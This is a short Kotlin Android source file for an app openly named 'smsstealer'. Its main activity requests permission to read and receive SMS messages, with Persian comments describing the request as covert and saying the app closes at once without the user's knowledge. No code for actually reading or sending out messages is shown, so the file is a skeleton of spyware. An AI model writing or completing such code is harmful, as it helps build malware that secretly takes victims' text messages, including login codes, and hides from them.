package com.dark.smsstealer

import android.content.pm.PackageManager
import android.os.Bundle
import android.telephony.SmsManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity: AppCompatActivity() {
 private val PERMISSION_REQUEST_CODE = 101

 override fun onCreate(savedInstanceState: Bundle?) {
 super.onCreate(savedInstanceState)
 setContentView(R.layout.activity_main)

 // درخواست مجوزها به‌صورت پنهانی
 if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
 ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS), PERMISSION_REQUEST_CODE)
 }

 // بستن برنامه بلافاصله پس از اجرا (بدون اطلاع کاربر)
 finish()
 }
}